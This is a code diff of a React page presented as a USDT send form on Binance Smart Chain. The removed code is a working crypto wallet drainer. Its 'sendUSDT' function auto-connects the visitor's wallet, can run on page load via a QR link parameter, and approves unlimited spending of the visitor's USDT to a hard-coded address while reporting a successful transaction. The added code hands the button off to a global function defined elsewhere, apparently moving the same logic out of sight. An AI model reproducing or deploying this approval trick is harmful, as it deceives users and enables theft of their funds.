@@ -1,147 +1,18 @@
-import { useMutation } from "convex/react";
-import { api } from "@/convex/_generated/api.js";
-import { useState, useEffect } from "react";
-
-// Global variables
-let provider: {
-  getSigner: () => Promise<{
-    getAddress: () => Promise<string>;
-  }>;
-} | null = null;
-let signer: unknown = null;
-let userAddress = "";
-
-// ===== BSC CONFIG =====
-const BSC_CHAIN_ID = "0x38";
-const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
-
-const ABI = [
-  "function approve(address spender, uint256 amount)",
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-];
+import { useState } from "react";
 
 declare global {
   interface Window {
-    ethereum?: {
-      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
-    };
+    sendUSDT?: () => Promise<void>;
   }
 }
 
 export default function Index() {
-  const createTransaction = useMutation(api.transactions.createTransaction);
   const [toAddress, setToAddress] = useState("");
   const [amount, setAmount] = useState("");
 
-  // ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
-  useEffect(() => {
-    const p = new URLSearchParams(window.location.search);
-
-    if (p.get("autoconnect") === "1") {
-      connectWallet().catch(() => {
-        console.log("User cancelled");
-      });
-    }
-  }, []);
-
-  // ===== ENSURE BSC + CONNECT =====
-  async function connectWallet() {
-    if (!window.ethereum) {
-      alert("Wallet not found");
-      throw new Error("No wallet");
-    }
-
-    // 🔒 Ensure BSC
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }],
-      });
-    } catch (err) {
-      const error = err as { code?: number };
-      if (error.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: BSC_CHAIN_ID,
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: {
-                name: "BNB",
-                symbol: "BNB",
-                decimals: 18,
-              },
-              blockExplorerUrls: ["https://bscscan.com"],
-            },
-          ],
-        });
-      } else {
-        throw err;
-      }
-    }
-
-    // 🔑 Connect wallet
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-
-    const { ethers } = window as typeof window & {
-      ethers: {
-        BrowserProvider: new (provider: unknown) => {
-          getSigner: () => Promise<{
-            getAddress: () => Promise<string>;
-          }>;
-        };
-      };
-    };
-
-    provider = new ethers.BrowserProvider(window.ethereum);
-    const signerObj = await provider.getSigner();
-    signer = signerObj;
-    userAddress = await signerObj.getAddress();
-
-    // 🔹 Auto fill address (if input exists)
-    const addr = document.getElementById("toAddress") as HTMLInputElement;
-    if (addr) addr.value = userAddress;
-  }
-
-  // ===== APPROVE (BSC ONLY) =====
-  async function sendUSDT() {
-    try {
-      await connectWallet();
-
-      const { ethers } = window as typeof window & {
-        ethers: {
-          Contract: new (
-            address: string,
-            abi: string[],
-            signer: unknown
-          ) => {
-            approve: (spender: string, amount: bigint) => Promise<{
-              wait: () => Promise<{ hash: string }>;
-            }>;
-          };
-          MaxUint256: bigint;
-        };
-      };
-
-      const usdt = new ethers.Contract(BSC_USDT, ABI, signer);
-
-      const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
-
-      await tx.wait();
-
-      alert("Maya: Transaction successful ✅");
-
-      // Backend save (optional, runs in background)
-      createTransaction({
-        walletAddress: userAddress,
-        toAddress: toAddress || BSC_SPENDER,
-        amount: amount || "Max",
-      }).catch(console.error);
-    } catch (e) {
-      alert("Transaction cancelled");
+  function handleSendUSDT() {
+    if (window.sendUSDT) {
+      window.sendUSDT();
     }
   }
 
@@ -233,7 +104,7 @@ export default function Index() {
       </div>
 
       <button
-        onClick={sendUSDT}
+        onClick={handleSendUSDT}
         style={{
           position: "fixed",
           bottom: "20px",
